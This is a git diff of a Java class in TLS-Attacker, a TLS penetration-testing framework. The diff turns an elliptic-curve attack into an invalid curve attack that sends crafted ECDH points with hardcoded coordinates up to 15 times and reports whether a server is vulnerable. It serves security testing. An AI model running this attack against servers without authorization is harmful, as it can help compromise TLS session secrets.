@@ -1,26 +1,25 @@
 /**
  * TLS-Attacker - A Modular Penetration Testing Framework for TLS.
  *
- * Copyright (C) 2015 Chair for Network and Data Security,
- *                    Ruhr University Bochum
- *                    (juraj.somorovsky@rub.de)
+ * Copyright (C) 2015 Chair for Network and Data Security, Ruhr University
+ * Bochum (juraj.somorovsky@rub.de)
  *
- * Licensed under the Apache License, Version 2.0 (the "License");
- * you may not use this file except in compliance with the License.
- * You may obtain a copy of the License at
+ * Licensed under the Apache License, Version 2.0 (the "License"); you may not
+ * use this file except in compliance with the License. You may obtain a copy of
+ * the License at
  *
  * http://www.apache.org/licenses/LICENSE-2.0
  *
  * Unless required by applicable law or agreed to in writing, software
- * distributed under the License is distributed on an "AS IS" BASIS,
- * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
- * See the License for the specific language governing permissions and
- * limitations under the License.
+ * distributed under the License is distributed on an "AS IS" BASIS, WITHOUT
+ * WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the
+ * License for the specific language governing permissions and limitations under
+ * the License.
  */
 package de.rub.nds.tlsattacker.attacks.impl;
 
 import de.rub.nds.tlsattacker.tls.Attacker;
-import de.rub.nds.tlsattacker.attacks.config.EllipticCurveAttackCommandConfig;
+import de.rub.nds.tlsattacker.attacks.config.InvalidCurveAttackCommandConfig;
 import de.rub.nds.tlsattacker.modifiablevariable.ModifiableVariableFactory;
 import de.rub.nds.tlsattacker.modifiablevariable.biginteger.BigIntegerModificationFactory;
 import de.rub.nds.tlsattacker.modifiablevariable.biginteger.ModifiableBigInteger;
@@ -28,18 +27,25 @@ import de.rub.nds.tlsattacker.modifiablevariable.bytearray.ByteArrayModification
 import de.rub.nds.tlsattacker.modifiablevariable.bytearray.ModifiableByteArray;
 import de.rub.nds.tlsattacker.tls.config.ConfigHandler;
 import de.rub.nds.tlsattacker.tls.constants.HandshakeMessageType;
+import de.rub.nds.tlsattacker.tls.exceptions.WorkflowExecutionException;
 import de.rub.nds.tlsattacker.tls.protocol.handshake.ECDHClientKeyExchangeMessage;
+import de.rub.nds.tlsattacker.tls.util.LogLevel;
 import de.rub.nds.tlsattacker.tls.workflow.TlsContext;
 import de.rub.nds.tlsattacker.tls.workflow.WorkflowExecutor;
 import de.rub.nds.tlsattacker.tls.workflow.WorkflowTrace;
 import de.rub.nds.tlsattacker.transport.TransportHandler;
+import java.math.BigInteger;
+import org.apache.logging.log4j.LogManager;
+import org.apache.logging.log4j.Logger;
 import org.bouncycastle.util.BigIntegers;
 
 /**
  * 
  * @author Juraj Somorovsky <juraj.somorovsky@rub.de>
  */
-public class EllipticCurveAttack extends Attacker<EllipticCurveAttackCommandConfig> {
+public class InvalidCurveAttack extends Attacker<InvalidCurveAttackCommandConfig> {
+
+    private static final Logger LOGGER = LogManager.getLogger(InvalidCurveAttack.class);
 
     /**
      * EC field size, currently set to 32, works for curves with 256 bits!
@@ -47,12 +53,42 @@ public class EllipticCurveAttack extends Attacker<EllipticCurveAttackCommandConf
      */
     private static final int CURVE_FIELD_SIZE = 32;
 
-    public EllipticCurveAttack(EllipticCurveAttackCommandConfig config) {
+    private static final int PROTOCOL_FLOWS = 15;
+
+    public InvalidCurveAttack(InvalidCurveAttackCommandConfig config) {
 	super(config);
     }
 
     @Override
     public void executeAttack(ConfigHandler configHandler) {
+
+	if (config.getPublicPointBaseX() == null || config.getPublicPointBaseY() == null
+		|| config.getPremasterSecret() == null) {
+
+	    config.setPublicPointBaseX(new BigInteger(
+		    "b70bf043c144935756f8f4578c369cf960ee510a5a0f90e93a373a21f0d1397f", 16));
+	    config.setPublicPointBaseY(new BigInteger(
+		    "4a2e0ded57a5156bb82eb4314c37fd4155395a7e51988af289cce531b9c17192", 16));
+	    config.setPremasterSecret(new BigInteger(
+		    "b70bf043c144935756f8f4578c369cf960ee510a5a0f90e93a373a21f0d1397f", 16));
+	    for (int i = 0; i < PROTOCOL_FLOWS; i++) {
+		try {
+		    WorkflowTrace trace = executeProtocolFlow(configHandler);
+		    if (trace.containsServerFinished()) {
+			LOGGER.log(LogLevel.CONSOLE_OUTPUT, "Vulnerable to the invalid curve attack.");
+			return;
+		    }
+		} catch (WorkflowExecutionException ex) {
+		    LOGGER.debug(ex.getLocalizedMessage());
+		}
+	    }
+	    LOGGER.log(LogLevel.CONSOLE_OUTPUT, "NOT vulnerable to the invalid curve attack.");
+	} else {
+	    executeProtocolFlow(configHandler);
+	}
+    }
+
+    private WorkflowTrace executeProtocolFlow(ConfigHandler configHandler) {
 	TransportHandler transportHandler = configHandler.initializeTransportHandler(config);
 	TlsContext tlsContext = configHandler.initializeTlsContext(config);
 	WorkflowExecutor workflowExecutor = configHandler.initializeWorkflowExecutor(transportHandler, tlsContext);
@@ -81,6 +117,8 @@ public class EllipticCurveAttack extends Attacker<EllipticCurveAttackCommandConf
 	workflowExecutor.executeWorkflow();
 
 	transportHandler.closeConnection();
+
+	return trace;
     }
 
 }
